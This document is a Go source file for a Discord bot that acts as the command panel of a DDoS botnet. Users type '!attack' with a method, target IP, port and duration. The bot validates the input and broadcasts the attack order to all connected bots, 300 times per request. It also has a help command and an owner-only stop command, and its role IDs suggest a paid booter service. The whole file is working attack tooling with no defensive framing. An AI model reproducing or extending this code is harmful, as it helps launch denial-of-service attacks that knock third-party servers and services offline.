package main

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
)

var (
	Token       string
	Methods     = []string{"HEX", "STD", "HTTP"}
	Running     = []string{}
	RunningHost = []string{}
	Premium     = "963908367791820911"
	Advanced    = "963903421373636638"
)

func run_bot() {
	if use_discord {
		dg, err := discordgo.New("Bot " + discord_bot_token)
		if err != nil {
			fmt.Println("error creating Discord session,", err)
			return
		}

		dg.AddHandler(messageCreate)
		dg.Identify.Intents = discordgo.IntentsGuildMessages

		err = dg.Open()
		if err != nil {
			fmt.Println("error opening connection,", err)
			return
		}

		dg.Close()
	}
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {

	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.ChannelID != command_channel {
		return
	}

	if !strings.Contains(m.Content, "!") {
		return
	}

	args := strings.Split(strings.Split(m.Content, "!")[1], " ")

	fmt.Println(args)

	if len(args) == 0 {
		return
	}

	if args[0] == "attack" && len(args) == 5 {
		method := args[1]
		ip := args[2]
		port, _ := strconv.Atoi(args[3])
		attack_time, _ := strconv.Atoi(args[4])

		if include(method, Methods) {
			if include(m.Author.ID, Running) {
				s.ChannelMessageSend(m.ChannelID, "Please wait end of your attack")
				return
			}

			if include(ip, RunningHost) {
				s.ChannelMessageSend(m.ChannelID, "An attack was already sent to this address")
				return
			}

			re, _ := regexp.Compile("^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")

			if !re.MatchString(ip) {
				s.ChannelMessageSend(m.ChannelID, "Invalid IP")
				return
			}

			if include(ip, blacklisted_target) == true {
				s.ChannelMessageSend(m.ChannelID, "This host is blacklisted")
				return
			}

			if port > 65535 || port < 1 {
				s.ChannelMessageSend(m.ChannelID, "Invalid port")
				return
			}

			if attack_time > 120 || attack_time < 5 {
				s.ChannelMessageSend(m.ChannelID, "Invalid attack_time (max: 120s - min: 5s)")
				return
			}

			go running_attack_thread(attack_time)
			for i := 0; i != 300; i++ {
				go send_all_bots(fmt.Sprintf("! %s %s %d %d", method, ip, port, attack_time))
			}

			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("`[Running attack: %d]` Attacking %s:%d with %s while %ds with %d bots ! (requested by <@%s>)", running_attacks, ip, port, method, attack_time, connected_bots, m.Author.ID))

			Running = append(Running, m.Author.ID)
			RunningHost = append(RunningHost, ip)

			go func(user_id string, attack_time int) {
				for i := 0; i != attack_time; i++ {
					time.Sleep(1 * time.Second)
				}

				Running = Remove(Running, user_id)
				RunningHost = Remove(RunningHost, ip)
				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Attack finished, <@%s>", user_id))
			}(m.Author.ID, attack_time)

		} else {
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Methods are: `HEX, HTTP, STD`"))
		}
	}

	if args[0] == "help" {
		s.ChannelMessageSend(m.ChannelID, "`!attack [method: HTTP, HEX, STD] [ip: 0.0.0.0] [port: 1-60999] [attack_time: 5-120s]`")
	}

	if args[0] == "stop" && m.Author.ID == "965741322185093161" {
		go send_all_bots("! STOP")
		s.ChannelMessageSend(m.ChannelID, "Stopped all attacks.")
		return
	}
}
